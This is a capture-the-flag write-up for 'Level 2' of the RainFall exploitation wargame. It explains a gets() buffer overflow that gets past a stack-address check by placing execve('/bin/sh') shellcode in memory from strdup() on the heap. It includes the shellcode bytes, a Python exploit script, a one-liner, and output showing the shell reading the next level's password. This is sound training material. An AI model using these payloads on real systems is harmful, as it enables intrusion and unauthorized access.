# Level 2

Here we also have a vulnerable `gets()` with a buffer overflow of 76 characters in. The difficulty this time is that we can't just give it a shellcode or use a ret2libc attack as the program will detect any return address starting with `0xb` and exit. We therefore can't directly use a stack address.
```C

    sym.imp.gets(&src);
    ret = __builtin_return_address(0);
    if ((ret & 0xb0000000) == 0xb0000000) {
        printf("(%p)\n", ret);
        exit(1);
    }
```

## Heap exploit

We'll try to inject this [shellcode](https://shell-storm.org/shellcode/files/shellcode-811.html), getting us a shell via `execve("/bin/sh")`.

Conveniently, strdup is called at the end of the program, allowing us to store our buffer overflow in the heap, well outside the `0xb` range and call it directly. Our exploit will look like this:

`shellcode (28 bytes) | padding (76 bytes + 4 bytes of alignment) | address of this buffer in the heap (little-endian)`

### Finding the address of the buffer 
We now need to find the return address of `strdup()`, to do this we can either use `gdb` and inspect `eax` after the call to strdup, or more easily just use `ltrace`.
```shell
level2@RainFall:~$ ltrace ./level2 <<< "hello world"
__libc_start_main(0x804853f, 1, 0xbffff804, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                = 0
gets(0xbffff70c, 0, 0, 0xb7e5ec73, 0x80482b5)                     = 0xbffff70c
puts("hello world"hello world
)                                               = 12
strdup("hello world")                                             = 0x0804a008
+++ exited (status 8) +++
```
The return value of `strdup()` is `0x0804a008` here.

### Putting the exploit together
We now have everything to exploit our binary, let's put together our exploit string

```python
import struct

#https://shell-storm.org/shellcode/files/shellcode-811.html
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

print (
	shellcode +
	"a" * ((76 + 4) - len(shellcode)) + # 52bytes of padding, after shellcode and for alignment
	struct.pack("<Q", 0x804a008) # The address of our shellcode in the heap
)
```

Now let's give this to program and keep a shell open with `cat`
```shell
level2@RainFall:~$ (python -c 'import struct; print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "a"*52 + struct.pack("<Q", 0x804a008)'; cat )| ./level2
1Ph//shh/bin°
             ̀1@̀aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
🥳

## Other solutions
Using a rop gadget could also help us bypass the check and run a ret2libc attack or shellcode
